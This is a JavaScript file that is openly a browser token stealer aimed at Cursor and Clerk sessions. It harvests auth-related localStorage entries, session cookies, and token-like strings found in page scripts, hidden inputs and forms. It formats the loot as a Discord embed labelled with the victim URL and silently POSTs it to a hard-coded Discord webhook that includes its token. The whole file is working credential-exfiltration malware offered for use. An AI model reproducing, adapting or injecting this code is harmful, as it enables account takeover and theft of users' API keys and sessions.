const webhookUrl = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
let stolenData = {
    url: window.location.href,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent.substring(0, 150),
    cursorLoot: {
        tokens: [],
        localStorage: {},
        cookies: {},
        pageTokens: []
    }
};

// Harvest localStorage for Cursor/Clerk goodies
try {
    Object.keys(localStorage).forEach(key => {
        const value = localStorage.getItem(key);
        if (/^(clerk|cursor|auth|session|token|api.?key|user)/i.test(key) || value && value.length > 20 && /[A-Za-z0-9_-]{30,}/.test(value)) {
            stolenData.cursorLoot.localStorage[key] = value.substring(0, 200);
            if (value.length > 30) stolenData.cursorLoot.tokens.push(`${key}: ${value.substring(0, 100)}...`);
        }
    });
} catch (err) {
    stolenData.error = err.message;
}

// Snag cookies
document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (/^(clerk|cursor|__session|auth|Secure)/i.test(name)) {
        stolenData.cursorLoot.cookies[name] = value ? value.substring(0, 200) : 'N/A';
    }
});

// Scour page for buried tokens (scripts, metas, forms)
try {
    document.querySelectorAll('script, meta[name="csrf"], input[type="hidden"], form').forEach(el => {
        const text = (el.textContent || el.innerHTML || el.value || '').toString();
        const matches = text.match(/[A-Za-z0-9_-]{32,150}/g);
        if (matches) {
            matches.forEach(match => {
                if (match.length > 40 && !/cursor\.com|localhost/i.test(match) && !stolenData.cursorLoot.tokens.includes(match)) {
                    stolenData.cursorLoot.pageTokens.push(`Page scan: ${match.substring(0, 80)}`);
                }
            });
        }
    });
} catch (err) {
    stolenData.error = (stolenData.error || '') + '; Scan err: ' + err.message;
}

// Bundle and ship to your webhook
const payload = {
    username: 'Rex Cursor API Grab',
    embeds: [{
        title: '🧠 Cursor Brainrot Stolen',
        description: `**Victim URL:** ${stolenData.url}\n**Time:** ${stolenData.timestamp}`,
        color: 0xFF4500,
        fields: [
            {
                name: `Tokens Hit (${stolenData.cursorLoot.tokens.length})`,
                value: stolenData.cursorLoot.tokens.length ? '```\n' + stolenData.cursorLoot.tokens.slice(0, 15).join('\n') + '\n... (more in storage)```' : '❌ Dry well',
                inline: false
            },
            {
                name: 'LocalStorage Keys',
                value: Object.keys(stolenData.cursorLoot.localStorage).join('\n') || 'None',
                inline: true
            },
            {
                name: 'Cookies Nabbed',
                value: Object.keys(stolenData.cursorLoot.cookies).join('\n') || 'Clean',
                inline: true
            },
            {
                name: 'Page Tokens',
                value: stolenData.cursorLoot.pageTokens.slice(0, 5).join('\n') || 'Nada',
                inline: false
            },
            {
                name: 'UA Snippet',
                value: stolenData.userAgent,
                inline: false
            }
        ],
        footer: { text: 'Rex API v1 - Update anytime' }
    }]
};

fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
}).catch(() => {}); // Silent if Discord flakes
